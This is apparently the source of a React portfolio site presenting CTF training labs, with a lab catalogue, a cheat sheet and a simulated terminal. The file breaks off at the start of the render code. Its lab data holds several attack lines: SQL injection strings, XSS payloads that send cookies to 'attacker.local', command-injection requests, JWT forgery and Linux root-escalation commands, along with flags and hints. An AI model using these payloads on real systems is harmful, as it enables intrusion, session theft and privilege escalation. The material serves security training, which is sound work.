import React, { useState, useEffect, useRef } from 'react';
import {
  Terminal as TerminalIcon,
  Shield,
  Search,
  CheckCircle2,
  AlertCircle,
  Copy,
  Check,
  Lock,
  Unlock,
  Play,
  Zap,
  Award,
  BookOpen,
  Cpu,
  Globe,
  FolderTree,
  Maximize2,
  Minimize2,
  RotateCcw,
  Hash,
  ChevronDown,
  ChevronUp,
  Server,
  Wifi,
  Layers,
  FileText,
  HelpCircle,
  Clock,
  Send,
  X
} from 'lucide-react';

// Type definitions
export type Category = 'All Labs' | 'Enumeration' | 'Web Exploitation' | 'Linux Fundamentals';
export type Difficulty = 'All' | 'Easy' | 'Medium' | 'Hard';

export interface Lab {
  id: string;
  title: string;
  category: 'Enumeration' | 'Web Exploitation' | 'Linux Fundamentals';
  difficulty: 'Easy' | 'Medium' | 'Hard';
  tag: string;
  description: string;
  target: string;
  estimatedTime: string;
  flag: string;
  objective: string;
  scenario: string;
  attackVector: string;
  tools: string[];
  suggestedCommands: string[];
  hints: string[];
}

// 12 Curated hands-on labs across the 3 core categories
const LABS_DATA: Lab[] = [
  // --- ENUMERATION HUB ---
  {
    id: 'enum-01',
    title: 'Recon-101: TCP Port & Service Enumeration',
    category: 'Enumeration',
    difficulty: 'Easy',
    tag: 'Network Discovery',
    description: 'Execute stealth SYN scans, detect service versions (-sV), and dissect banner grabs across a hardened subnet.',
    target: '10.10.110.24',
    estimatedTime: '20 mins',
    flag: 'CTF{nmap_syn_stealth_revealed_2280}',
    objective: 'Discover open ports, identify the daemon version on non-standard port 8080, and capture the header flag.',
    scenario: 'A target asset was deployed with uncatalogued listener sockets. Your mission is to map open services without triggering noisy IDS alerts.',
    attackVector: 'TCP Half-open SYN scan combined with version detection and default NSE reconnaissance scripts.',
    tools: ['Nmap', 'Netcat', 'Rustscan'],
    suggestedCommands: [
      'nmap -sS -Pn -T4 10.10.110.24',
      'nmap -sV -sC -p 22,80,8080 10.10.110.24',
      'nc -nv 10.10.110.24 8080'
    ],
    hints: [
      'Use -sS for stealth SYN scanning to stay under rate-limiting thresholds.',
      'Check port 8080: sending a raw GET HTTP/1.0 request triggers the target service to echo the verification flag.',
      'Flag format: CTF{...}'
    ]
  },
  {
    id: 'enum-02',
    title: 'DirBuster Prime: Web Endpoint & Secret Fuzzing',
    category: 'Enumeration',
    difficulty: 'Easy',
    tag: 'Directory Busting',
    description: 'Uncover hidden admin routes, forgotten .bak files, and exposed internal git repositories using targeted wordlists.',
    target: 'http://target.corp:8080/',
    estimatedTime: '25 mins',
    flag: 'CTF{gobuster_hidden_admin_git_leak}',
    objective: 'Fuzz the web root to locate hidden configuration backups and the unindexed administrative endpoint.',
    scenario: 'Developers recently rolled out an internal staging portal. An unindexed .git repository and a backup archive were inadvertently left exposed.',
    attackVector: 'Wordlist-based URI dictionary attacks and file extension bruteforcing (.bak, .old, .zip, .git).',
    tools: ['Gobuster', 'ffuf', 'SecLists'],
    suggestedCommands: [
      'gobuster dir -u http://target.corp:8080/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak',
      'ffuf -u http://target.corp:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt',
      'curl -i http://target.corp:8080/.git/HEAD'
    ],
    hints: [
      'Look for the /.secret_admin/ folder or /.git/ directory.',
      'A configuration file named config.php.bak in the hidden route exposes the secret flag.',
      'Try querying http://target.corp:8080/.secret_admin/flag.txt'
    ]
  },
  {
    id: 'enum-03',
    title: 'Banner Grab & Anonymous FTP Enumeration',
    category: 'Enumeration',
    difficulty: 'Medium',
    tag: 'Service Banner Grabbing',
    description: 'Interrogate misconfigured FTP daemon banners, probe vsftpd configurations, and recover unencrypted backup archives.',
    target: 'ftp://10.10.110.45:21',
    estimatedTime: '30 mins',
    flag: 'CTF{anon_ftp_banner_loot_unlocked}',
    objective: 'Connect with anonymous credentials, inspect service headers, and extract credentials from the public drop folder.',
    scenario: 'Legacy file transfer services often run with default anonymous access permitted, granting read access to sensitive system manifests.',
    attackVector: 'Anonymous FTP authentication (anonymous:guest), banner version auditing, and passive data channel retrieval.',
    tools: ['Netcat', 'ftp-client', 'Nmap NSE'],
    suggestedCommands: [
      'nc -nv 10.10.110.45 21',
      'nmap --script ftp-anon,ftp-syst -p 21 10.10.110.45',
      'ftp -p 10.10.110.45 (login: anonymous / pass: anonymous)'
    ],
    hints: [
      'Connect via FTP with username "anonymous" and any email address.',
      'Run "ls -la" in the FTP shell to inspect hidden files like .backup_credentials.txt.',
      'Binary transfer mode helps retrieve corrupted dumps cleanly.'
    ]
  },
  {
    id: 'enum-04',
    title: 'DNS Reconnaissance & Zone Transfer Exploit',
    category: 'Enumeration',
    difficulty: 'Hard',
    tag: 'OSINT & DNS',
    description: 'Query misconfigured BIND DNS nameservers using AXFR requests to map corporate subdomains and internal infrastructure.',
    target: 'dns://ns1.shadowcorp.net',
    estimatedTime: '35 mins',
    flag: 'CTF{axfr_zone_transfer_domain_spill}',
    objective: 'Initiate an authoritative AXFR query against ns1.shadowcorp.net and extract the entire internal zone map.',
    scenario: 'A misconfigured secondary DNS server accepts zone transfers from any requester, leaking private IP allocations and staging hostnames.',
    attackVector: 'Unrestricted DNS AXFR (Asynchronous Full Transfer) query to uncover hidden TXT records and internal records.',
    tools: ['dig', 'dnsrecon', 'host'],
    suggestedCommands: [
      'dig @ns1.shadowcorp.net shadowcorp.net AXFR',
      'host -l shadowcorp.net ns1.shadowcorp.net',
      'dnsrecon -d shadowcorp.net -t axfr'
    ],
    hints: [
      'Run dig with the AXFR type query against the target nameserver.',
      'Inspect the returned TXT records for flag metadata attached to the staging subdomain record.',
      'Flag is embedded within the dev-internal.shadowcorp.net TXT entry.'
    ]
  },

  // --- WEB EXPLOITATION HUB ---
  {
    id: 'web-01',
    title: 'SQLi Gateway: Union-Based Authentication Bypass',
    category: 'Web Exploitation',
    difficulty: 'Easy',
    tag: 'SQL Injection',
    description: 'Bypass authentication queries via tautology payloads and extract password hashes using UNION SELECT statements.',
    target: 'http://auth.target.corp/login',
    estimatedTime: '25 mins',
    flag: 'CTF{union_sqli_admin_hash_retrieved}',
    objective: 'Subvert the SQL statement logic in the username input to authenticate as admin and extract the database secret.',
    scenario: 'A legacy login form concatenates raw user strings directly into an SQL statement: SELECT * FROM users WHERE user=\'$user\' AND pass=\'$pass\'.',
    attackVector: 'Authentication bypass via single-quote delimiter and inline SQL comment, followed by UNION column balancing.',
    tools: ['Burp Suite', 'SQLMap', 'cURL'],
    suggestedCommands: [
      "curl -d \"username=admin' OR 1=1-- -&password=foo\" http://auth.target.corp/login",
      "sqlmap -u \"http://auth.target.corp/login\" --data=\"username=admin&password=foo\" --dump"
    ],
    hints: [
      "Inject ' OR '1'='1' -- into the username field to turn the WHERE condition unconditionally true.",
      "To extract table schema, determine the column count using: ' UNION SELECT null, null, null-- -",
      "Look inside the 'system_flags' table for the administrator hash and flag."
    ]
  },
  {
    id: 'web-02',
    title: 'XSS Vector Lab: Stored & DOM-Based Payloads',
    category: 'Web Exploitation',
    difficulty: 'Medium',
    tag: 'XSS',
    description: 'Bypass client-side sanitizers and HTML character filters to execute stored JavaScript that captures session tokens.',
    target: 'http://feedback.target.corp/',
    estimatedTime: '30 mins',
    flag: 'CTF{xss_stored_cookie_intercept_882}',
    objective: 'Craft an XSS payload that triggers within the admin review panel to steal the session cookie containing the flag.',
    scenario: 'The customer feedback portal renders submissions to an automated bot simulator without sanitizing angle brackets or event handlers.',
    attackVector: 'Stored Cross-Site Scripting (XSS) exploiting SVG onload and image onerror attributes to exfiltrate document.cookie.',
    tools: ['Burp Suite', 'Browser DevTools', 'Webhook/Netcat'],
    suggestedCommands: [
      "<img src=x onerror=\"fetch('http://attacker.local/?c='+document.cookie)\">",
      "<svg onload=alert(document.cookie)>",
      "<script>new Image().src='http://attacker.local/log?data='+btoa(document.cookie);</script>"
    ],
    hints: [
      'The word "<script>" is filtered by a basic regex, but event handler vectors like <img src=x onerror=...> bypass it.',
      'The simulated bot reads the feedback within 5 seconds and evaluates your payload in its context.',
      'The cookie value contains the lab verification flag.'
    ]
  },
  {
    id: 'web-03',
    title: 'Remote Command Injection via Ping Utility',
    category: 'Web Exploitation',
    difficulty: 'Medium',
    tag: 'Command Injection',
    description: 'Exploit unsanitized shell concatenation in a network diagnostics tool using command separators to execute arbitrary code.',
    target: 'http://tools.target.corp/ping',
    estimatedTime: '30 mins',
    flag: 'CTF{rce_semicolon_cat_passwd_pwned}',
    objective: 'Chain shell commands into the IP parameter to read /etc/passwd and inspect the environment variables.',
    scenario: 'A web-based ping utility passes user input directly into system("ping -c 2 " . $_POST[\'ip\']); without whitelisting IP formatting.',
    attackVector: 'Command chaining via semicolon (;), pipe (|), or logical AND (&&) to gain full OS-level execution.',
    tools: ['Burp Suite', 'cURL', 'Bash'],
    suggestedCommands: [
      'curl -X POST http://tools.target.corp/ping -d "ip=127.0.0.1; whoami"',
      'curl -X POST http://tools.target.corp/ping -d "ip=127.0.0.1; cat /etc/passwd"',
      'curl -X POST http://tools.target.corp/ping -d "ip=127.0.0.1; cat /flag.txt"'
    ],
    hints: [
      'Use the semicolon ; or double ampersand && to append a second command.',
      'Check if spaces are filtered; if so, substitute ${IFS} or tabs.',
      'Execute: 127.0.0.1; cat /flag.txt to retrieve the secret flag.'
    ]
  },
  {
    id: 'web-04',
    title: 'Burp Suite Tamper: JWT Algorithm "None" & Param Pollution',
    category: 'Web Exploitation',
    difficulty: 'Hard',
    tag: 'Burp Suite & Auth Bypass',
    description: 'Intercept and forge JSON Web Tokens in Burp Repeater, altering user claims from "viewer" to "administrator" via None-algorithm spoofing.',
    target: 'http://api.target.corp/v1/user',
    estimatedTime: '40 mins',
    flag: 'CTF{jwt_alg_none_privilege_hijack}',
    objective: 'Rewrite the JWT header to {"alg":"none","typ":"JWT"} and claim {"role":"admin"} to access the root management API.',
    scenario: 'The backend microservice relies on a vulnerable JWT library that permits unverified tokens when the "alg" header parameter is set to "none" or "None".',
    attackVector: 'Cryptographic downgrade and signature stripping to bypass token verification on administrative endpoints.',
    tools: ['Burp Suite', 'jwt_tool', 'Python'],
    suggestedCommands: [
      'echo -n \'{"alg":"none","typ":"JWT"}\' | base64 | tr -d \'=\'',
      'echo -n \'{"user":"abdurrahman","role":"admin"}\' | base64 | tr -d \'=\'',
      'curl -H "Authorization: Bearer <FORGED_JWT>." http://api.target.corp/v1/admin/flag'
    ],
    hints: [
      'Strip the third segment (the signature) completely, leaving the trailing dot: header.payload.',
      'Ensure the algorithm case is tried as "none", "None", and "NONE".',
      'Submit the forged Authorization header to the /v1/admin/flag endpoint.'
    ]
  },

  // --- LINUX FUNDAMENTALS HUB ---
  {
    id: 'linux-01',
    title: 'POSIX Permissions & SUID Binary Hunting',
    category: 'Linux Fundamentals',
    difficulty: 'Easy',
    tag: 'File Permissions',
    description: 'Audit file permission bits (rwxr-xr-x), discover setuid executables with find, and spawn root shells via misconfigured binaries.',
    target: 'ssh student@10.10.14.88',
    estimatedTime: '20 mins',
    flag: 'CTF{suid_bit_find_exec_root_shell}',
    objective: 'Locate atypical SUID binaries owned by root and exploit /usr/bin/find to spawn an elevated privilege shell.',
    scenario: 'A system administrator accidentally set the SUID bit on common system utilities to allow junior engineers to run debug commands.',
    attackVector: 'Exploitation of binaries with the 4000 (SUID) bit set, utilizing native command execution flags without dropping privileges.',
    tools: ['find', 'GTFOBins', 'bash'],
    suggestedCommands: [
      'find / -perm -u=s -type f 2>/dev/null',
      '/usr/bin/find . -exec /bin/sh -p \\; -quit',
      'id'
    ],
    hints: [
      'Run: find / -perm -4000 -type f 2>/dev/null to list all SUID binaries.',
      'Notice that /usr/bin/find has the SUID bit enabled (-rwsr-xr-x).',
      'Check GTFOBins for find: running "find . -exec /bin/sh -p \\; -quit" drops you into a root shell with EUID=0.'
    ]
  },
  {
    id: 'linux-02',
    title: 'Sudoers Misconfiguration & GTFOBins Escalation',
    category: 'Linux Fundamentals',
    difficulty: 'Medium',
    tag: 'Privilege Escalation',
    description: 'Audit sudo -l rules for NOPASSWD entries and escape restricted environments using text editors or pagers.',
    target: 'ssh guest@10.10.14.92',
    estimatedTime: '30 mins',
    flag: 'CTF{gtfobins_sudo_nopasswd_escalated}',
    objective: 'Examine sudo permissions for user guest and leverage vim or less to escape to a persistent root shell.',
    scenario: 'The /etc/sudoers file contains the line: "guest ALL=(ALL) NOPASSWD: /usr/bin/vim /var/log/syslog".',
    attackVector: 'Sudoers privilege abuse without password checks, triggering built-in subshell execution (:!/bin/bash) inside terminal pagers.',
    tools: ['sudo', 'GTFOBins', 'vim'],
    suggestedCommands: [
      'sudo -l',
      'sudo vim -c \':!/bin/bash\'',
      'cat /root/root_flag.txt'
    ],
    hints: [
      'Run "sudo -l" to see what binaries your user is permitted to execute as root.',
      'When executing vim with sudo, type ":!/bin/sh" or ":!/bin/bash" to drop into a root prompt.',
      'Read /root/root_flag.txt to capture the flag.'
    ]
  },
  {
    id: 'linux-03',
    title: 'Cron Job Hijacking & Wildcard Injection',
    category: 'Linux Fundamentals',
    difficulty: 'Medium',
    tag: 'System Internals',
    description: 'Inspect root-scheduled cron tasks executing world-writable scripts or exploiting tar wildcard privilege escalation (tar *).',
    target: '/etc/crontab',
    estimatedTime: '35 mins',
    flag: 'CTF{cron_wildcard_tar_privesc_complete}',
    objective: 'Audit /etc/crontab, spot the wildcard tar archive task, and create checkpoint files to execute an arbitrary reverse shell as root.',
    scenario: 'A recurring cron job runs "cd /var/backups && tar -czf backup.tar.gz *" every two minutes as root. The directory is world-writable.',
    attackVector: 'Unix argument injection via filenames matching tar CLI flags (--checkpoint=1 and --checkpoint-action=exec=...).',
    tools: ['cron', 'tar', 'Bash scripting'],
    suggestedCommands: [
      'cat /etc/crontab',
      'cd /var/backups && echo "chmod +s /bin/bash" > shell.sh && chmod +x shell.sh',
      'touch "/var/backups/--checkpoint=1" && touch "/var/backups/--checkpoint-action=exec=sh shell.sh"',
      '/bin/bash -p'
    ],
    hints: [
      'Examine /etc/crontab to find automated jobs running as root.',
      'When tar expands the asterisk *, filenames like --checkpoint=1 become arguments to tar.',
      'Set an SUID bit on /bin/bash and launch it with /bin/bash -p.'
    ]
  },
  {
    id: 'linux-04',
    title: 'Automated Recon Scripting & Kernel Auditing',
    category: 'Linux Fundamentals',
    difficulty: 'Hard',
    tag: 'Shell Scripting',
    description: 'Author custom Bash audit scripts to parse /proc, inspect capabilities (getcap), and run automated vulnerability scanners.',
    target: 'bash /opt/audit.sh',
    estimatedTime: '40 mins',
    flag: 'CTF{bash_audit_linpeas_kernel_mastery}',
    objective: 'Deploy a reconnaissance script to locate Linux file capabilities (cap_setuid) and vulnerable kernel versions.',
    scenario: 'Post-exploitation enumeration demands rapid host profiling without dropping noisy pre-compiled binaries that trigger endpoint detection.',
    attackVector: 'Capability hunting via getcap -r / 2>/dev/null and memory maps inspection to locate privilege boundary leaks.',
    tools: ['LinPEAS', 'Bash', 'getcap', 'strace'],
    suggestedCommands: [
      'getcap -r / 2>/dev/null',
      '/usr/bin/python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'',
      'uname -r; cat /etc/os-release'
    ],
    hints: [
      'Look for binaries configured with cap_setuid+ep capability.',
      'If python3 has cap_setuid, it can elevate its UID to 0 without standard SUID bits.',
      'The flag is located in /var/log/audit/flag.log.'
    ]
  }
];

// Curated cheat sheet commands for high productivity
const CHEAT_SHEET_COMMANDS = [
  {
    category: 'Enumeration',
    title: 'Nmap Fast SYN & Version Scan',
    cmd: 'nmap -sS -sV -T4 -p- --min-rate 1000 10.10.110.24'
  },
  {
    category: 'Enumeration',
    title: 'Directory Fuzzing with Gobuster',
    cmd: 'gobuster dir -u http://target.corp:8080/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak'
  },
  {
    category: 'Web Exploitation',
    title: 'SQLi Auth Tautology Payload',
    cmd: "admin' OR '1'='1' -- -"
  },
  {
    category: 'Web Exploitation',
    title: 'Command Injection Basic RCE Check',
    cmd: '; id; whoami; uname -a'
  },
  {
    category: 'Linux Fundamentals',
    title: 'SUID Binaries Discovery',
    cmd: 'find / -perm -u=s -type f 2>/dev/null'
  },
  {
    category: 'Linux Fundamentals',
    title: 'Sudoers Permissions Check',
    cmd: 'sudo -l'
  }
];

export default function App() {
  // State management
  const [selectedCategory, setSelectedCategory] = useState<Category>('All Labs');
  const [selectedDifficulty, setSelectedDifficulty] = useState<Difficulty>('All');
  const [searchQuery, setSearchQuery] = useState<string>('');
  const [activeLabModal, setActiveLabModal] = useState<Lab | null>(null);
  
  // Solved labs tracker with local storage persistence
  const [solvedLabs, setSolvedLabs] = useState<string[]>(() => {
    try {
      const saved = localStorage.getItem('ctf_labs_solved');
      return saved ? JSON.parse(saved) : ['enum-01'];
    } catch {
      return ['enum-01'];
    }
  });

  // Flag input state inside lab modal
  const [flagInput, setFlagInput] = useState<string>('');
  const [flagFeedback, setFlagFeedback] = useState<{ status: 'idle' | 'success' | 'error'; message: string }>({
    status: 'idle',
    message: ''
  });
  const [revealedHints, setRevealedHints] = useState<number[]>([]);
  const [copiedText, setCopiedText] = useState<string | null>(null);

  // Terminal simulator state
  const [terminalHistory, setTerminalHistory] = useState<Array<{ id: string; command: string; output: React.ReactNode; isError?: boolean }>>([
    {
      id: 'init-1',
      command: 'banner',
      output: (
        <div className="text-slate-300">
          <pre className="text-xs sm:text-sm font-mono text-[#00ff66] leading-tight select-none">
{`   _____ _______ ______   _               ____   _____ 
  / ____|__   __|  ____| | |        /\\   |  _ \\ / ____|
 | |       | |  | |__    | |       /  \\  | |_) | (___  
 | |       | |  |  __|   | |      / /\\ \\ |  _ < \\___ \\ 
 | |____   | |  | |      | |____ / ____ \\| |_) |____) |
  \\_____|  |_|  |_|      |______/_/    \\_\\____/|_____/ `}
          </pre>
          <div className="mt-2 text-xs text-slate-400">
            CTF / LABS Terminal Emulator v3.4.0-release<br />
            Curated by Abdurrahman · System status: <span className="text-[#00ff66] font-semibold">ONLINE</span><br />
            Type <span className="text-[#00ff66] font-bold">help</span> to view available commands.
          </div>
        </div>
      )
    }
  ]);

  const [commandInput, setCommandInput] = useState<string>('');
  const [historyIndex, setHistoryIndex] = useState<number>(-1);
  const [pastCommands, setPastCommands] = useState<string[]>(['help']);
  const [terminalTheme, setTerminalTheme] = useState<'green' | 'red' | 'cyan'>('green');
  const [isTerminalMaximized, setIsTerminalMaximized] = useState<boolean>(false);
  const terminalBottomRef = useRef<HTMLDivElement>(null);
  const terminalInputRef = useRef<HTMLInputElement>(null);

  // Persist solved labs
  useEffect(() => {
    try {
      localStorage.setItem('ctf_labs_solved', JSON.stringify(solvedLabs));
    } catch {
      // safe fallback
    }
  }, [solvedLabs]);

  // Scroll terminal to bottom when new history is added
  useEffect(() => {
    terminalBottomRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [terminalHistory]);

  // Copy helper
  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedText(text);
    setTimeout(() => setCopiedText(null), 2000);
  };

  // Flag submission validator
  const handleFlagSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!activeLabModal) return;

    const trimmed = flagInput.trim();
    if (trimmed === activeLabModal.flag) {
      if (!solvedLabs.includes(activeLabModal.id)) {
        setSolvedLabs(prev => [...prev, activeLabModal.id]);
      }
      setFlagFeedback({
        status: 'success',
        message: 'AUTHENTICATION VERIFIED! Flag accepted. Target compromised.'
      });
    } else {
      setFlagFeedback({
        status: 'error',
        message: 'ACCESS DENIED: Incorrect flag hash. Review lab telemetry and retry.'
      });
    }
  };

  // Filter labs based on search query, category, difficulty
  const filteredLabs = LABS_DATA.filter(lab => {
    const matchesCategory = selectedCategory === 'All Labs' || lab.category === selectedCategory;
    const matchesDifficulty = selectedDifficulty === 'All' || lab.difficulty === selectedDifficulty;
    const query = searchQuery.toLowerCase().trim();
    const matchesQuery =
      query === '' ||
      lab.title.toLowerCase().includes(query) ||
      lab.description.toLowerCase().includes(query) ||
      lab.tag.toLowerCase().includes(query) ||
      lab.tools.some(t => t.toLowerCase().includes(query));

    return matchesCategory && matchesDifficulty && matchesQuery;
  });

  // Terminal command executor
  const handleTerminalSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const rawCmd = commandInput.trim();
    if (!rawCmd) return;

    // Add to command history
    setPastCommands(prev => [...prev, rawCmd]);
    setHistoryIndex(-1);
    setCommandInput('');

    const args = rawCmd.split(' ').filter(Boolean);
    const cmd = args[0].toLowerCase();
    const subArg = args.slice(1).join(' ');

    const newId = `cmd-${Date.now()}`;

    if (cmd === 'clear') {
      setTerminalHistory([]);
      return;
    }

    let outputNode: React.ReactNode = null;
    let isError = false;

    switch (cmd) {
      case 'help':
        outputNode = (
          <div className="space-y-1 text-xs">
            <div className="text-slate-400 mb-2">Available System Commands:</div>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-2">
              <div><span className="text-[#00ff66] font-mono font-bold">help</span> - Display this command index</div>
              <div><span className="text-[#00ff66] font-mono font-bold">whoami</span> - Inspect active security researcher identity</div>
              <div><span className="text-[#00ff66] font-mono font-bold">skills</span> - Breakdown of offensive & defensive domains</div>
              <div><span className="text-[#00ff66] font-mono font-bold">ls</span> - List directory manifests and challenges</div>
              <div><span className="text-[#00ff66] font-mono font-bold">cat flag.txt</span> - Inspect root platform verification flag</div>
              <div><span className="text-[#00ff66] font-mono font-bold">cat notes.txt</span> - Read Abdurrahman's offensive methodology notes</div>
              <div><span className="text-[#00ff66] font-mono font-bold">nmap [target]</span> - Execute simulated network port scanner</div>
              <div><span className="text-[#00ff66] font-mono font-bold">sudo -l</span> - Audit elevated administrative permissions</div>
              <div><span className="text-[#00ff66] font-mono font-bold">uname -a</span> - View Linux system kernel details</div>
              <div><span className="text-[#00ff66] font-mono font-bold">theme</span> - Toggle neon accent colors (green/red/cyan)</div>
              <div><span className="text-[#00ff66] font-mono font-bold">clear</span> - Clear terminal session output</div>
            </div>
          </div>
        );
        break;

      case 'whoami':
        outputNode = (
          <div className="text-xs text-slate-300">
            <span className="text-[#00ff66] font-semibold">abdurrahman</span> (Security Researcher, Lab Architect & CTF Maintainer)<br />
            <span className="text-slate-500">Privileges: standard_user (wheel group) · Context: ctf-labs / offensive-ops</span>
          </div>
        );
        break;

      case 'skills':
        outputNode = (
          <div className="text-xs space-y-2 text-slate-300">
            <div className="text-[#00ff66] font-bold border-b border-slate-800 pb-1">Abdurrahman - Technical Domain Matrix:</div>
            <div className="space-y-1">
              <p><span className="text-amber-400 font-semibold">[Enumeration & Recon]:</span> Network Discovery, Nmap NSE Scripting, Service Banner Grabbing, Directory Busting (Gobuster/ffuf), DNS Zone Transfers (AXFR), OSINT.</p>
              <p><span className="text-[#ff2a5f] font-semibold">[Web Exploitation]:</span> SQL Injection (UNION / Blind / Error-based), Cross-Site Scripting (Stored / DOM), Command Injection, Burp Suite Tampering, JWT None-Alg Forgery, Auth Bypass.</p>
              <p><span className="text-[#00f0ff] font-semibold">[Linux Fundamentals]:</span> POSIX Permissions, SUID/SGID Exploitation, Sudoers NOPASSWD Escapes, GTFOBins, Cron Wildcard Injection, Kernel Auditing, Bash Automation.</p>
              <p><span className="text-emerald-400 font-semibold">[Red Team Engineering]:</span> Payload Obfuscation, Reverse Shell Architecture, Host Hardening & Post-Exploitation.</p>
            </div>
          </div>
        );
        break;

      case 'ls':
        outputNode = (
          <div className="text-xs font-mono text-slate-300 flex flex-wrap gap-4">
            <span className="text-red-400 font-semibold">flag.txt</span>
            <span className="text-amber-300 font-semibold">notes.txt</span>
            <span className="text-blue-400 font-semibold">recon_targets.nmap</span>
            <span className="text-purple-400 font-semibold">tools/</span>
            <span className="text-emerald-400 font-semibold">exploits/</span>
            <span className="text-cyan-400 font-semibold">labs/</span>
          </div>
        );
        break;

      case 'cat':
        if (subArg === 'flag.txt') {
          outputNode = (
            <div className="text-xs p-2 rounded bg-red-950/40 border border-[#ff2a5f]/40 font-mono text-[#ff2a5f]">
              [+] TERMINAL ROOT FLAG RETRIEVED:<br />
              <span className="font-bold text-white bg-black/60 px-2 py-0.5 rounded inline-block mt-1">
                CTF&#123;abdurrahman_terminal_master_0x7f9a&#125;
              </span>
            </div>
          );
        } else if (subArg === 'notes.txt') {
          outputNode = (
            <div className="text-xs text-slate-300 space-y-1 font-mono">
              <div className="text-amber-400 font-semibold">--- FIELD METHODOLOGY NOTES : ABDURRAHMAN ---</div>
              <div>1. Always start with comprehensive passive enumeration before active socket scans.</div>
              <div>2. When auditing web endpoints, capture and inspect every request header in Burp Suite.</div>
              <div>3. On Linux targets, always run 'sudo -l' and check 'find / -perm -4000 2&gt;/dev/null'.</div>
              <div>4. Persistence is key. The flag is always hidden where the developer least expects it.</div>
            </div>
          );
        } else if (subArg === 'recon_targets.nmap') {
          outputNode = (
            <div className="text-xs text-slate-300 font-mono">
              # Nmap 7.94 scan initiated<br />
              Nmap scan report for 10.10.110.24<br />
              Host is up (0.0021s latency).<br />
              PORT     STATE SERVICE VERSION<br />
              22/tcp   open  ssh     OpenSSH 8.9p1<br />
              80/tcp   open  http    nginx 1.18.0<br />
              8080/tcp open  http    Apache Tomcat 9.0.41
            </div>
          );
        } else if (!subArg) {
          outputNode = <div className="text-xs text-amber-400">Usage: cat &lt;filename&gt; (e.g. cat flag.txt)</div>;
        } else {
          outputNode = <div className="text-xs text-red-400">cat: {subArg}: No such file or directory</div>;
          isError = true;
        }
        break;

      case 'nmap':
        outputNode = (
          <div className="text-xs text-slate-300 font-mono space-y-1">
            <div className="text-emerald-400">Starting Nmap 7.94 ( https://nmap.org ) at {new Date().toISOString()}</div>
            <div>Nmap scan report for {subArg || '10.10.110.24'}</div>
            <div>Host is up (0.00045s latency).</div>
            <div>Not shown: 997 closed tcp ports (reset)</div>
            <div className="mt-1 text-slate-200">PORT     STATE SERVICE     VERSION</div>
            <div>21/tcp   open  ftp         vsftpd 3.0.3 (Anonymous access allowed)</div>
            <div>80/tcp   open  http        Apache httpd 2.4.52</div>
            <div>8080/tcp open  http-proxy  Node.js Express framework</div>
            <div className="text-slate-400 mt-1">Service detection performed. 1 target host verified up.</div>
          </div>
        );
        break;

      case 'sudo':
        if (subArg === '-l') {
          outputNode = (
            <div className="text-xs font-mono text-slate-300 space-y-1">
              <div>Matching Defaults entries for abdurrahman on ctf-labs:</div>
              <div className="text-slate-400">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin</div>
              <div className="mt-1">User abdurrahman may run the following commands on ctf-labs:</div>
              <div className="text-[#00ff66] font-bold">    (root) NOPASSWD: /usr/bin/find, /usr/bin/vim /var/log/syslog</div>
            </div>
          );
        } else {
          outputNode = <div className="text-xs text-slate-400">Try running: sudo -l to inspect administrative delegations.</div>;
        }
        break;

      case 'uname':
        outputNode = (
          <div className="text-xs font-mono text-slate-300">
            Linux ctf-labs 6.8.0-45-generic #45-Ubuntu SMP PREEMPT_DYNAMIC Wed Jul 10 17:35:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
          </div>
        );
        break;

      case 'pwd':
        outputNode = <div className="text-xs font-mono text-slate-300">/home/abdurrahman</div>;
        break;

      case 'theme':
        if (terminalTheme === 'green') setTerminalTheme('red');
        else if (terminalTheme === 'red') setTerminalTheme('cyan');
        else setTerminalTheme('green');
        outputNode = (
          <div className="text-xs font-mono text-slate-300">
            Terminal theme toggled. Active accent: <span className="font-bold text-white">{terminalTheme === 'green' ? 'Crimson Red' : terminalTheme === 'red' ? 'Cyber Cyan' : 'Neon Green'}</span>
          </div>
        );
        break;

      default:
        outputNode = (
          <div className="text-xs font-mono text-red-400">
            bash: {cmd}: command not found. Type <span className="text-[#00ff66] underline">help</span> for supported interactive commands.
          </div>
        );
        isError = true;
    }

    setTerminalHistory(prev => [
      ...prev,
      {
        id: newId,
        command: rawCmd,
        output: outputNode,
        isError
      }
    ]);
  };

  // Keyboard navigation for terminal history (Up / Down arrows)
  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (pastCommands.length > 0) {
        const nextIndex = historyIndex + 1 < pastCommands.length ? historyIndex + 1 : historyIndex;
        setHistoryIndex(nextIndex);
        setCommandInput(pastCommands[pastCommands.length - 1 - nextIndex]);
      }
    } else if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (historyIndex > 0) {
        const nextIndex = historyIndex - 1;
        setHistoryIndex(nextIndex);
        setCommandInput(pastCommands[pastCommands.length - 1 - nextIndex]);
      } else if (historyIndex === 0) {
        setHistoryIndex(-1);
        setCommandInput('');
      }
    } else if (e.key === 'Tab') {
      e.preventDefault();
      // Simple autocompletion
      const candidates = ['help', 'whoami', 'skills', 'ls', 'cat flag.txt', 'cat notes.txt', 'clear', 'nmap', 'sudo -l', 'uname -a'];
      const match = candidates.find(c => c.startsWith(commandInput.toLowerCase()));
      if (match) {
        setCommandInput(match);
      }
    }
  };

  // Open modal with clean state
  const openLabModal = (lab: Lab) => {
    setActiveLabModal(lab);
    setFlagInput('');
    setFlagFeedback({ status: 'idle', message: '' });
    setRevealedHints([]);
  };

  // Toggle hint reveal
  const toggleHint = (index: number) => {
    setRevealedHints(prev =>
      prev.includes(index) ? prev.filter(i => i !== index) : [...prev, index]
    );
  };

  // Accent styles according to active theme
  const getThemeColorClass = () => {
    if (terminalTheme === 'red') return 'text-[#ff2a5f]';
    if (terminalTheme === 'cyan') return 'text-[#00f0ff]';
    return 'text-[#00ff66]';
  };

  const getThemeBorderClass = () => {
    if (terminalTheme === 'red') return 'border-[#ff2a5f]/40';
    if (terminalTheme === 'cyan') return 'border-[#00f0ff]/40';
    return 'border-[#00ff66]/40';
  };

  return (
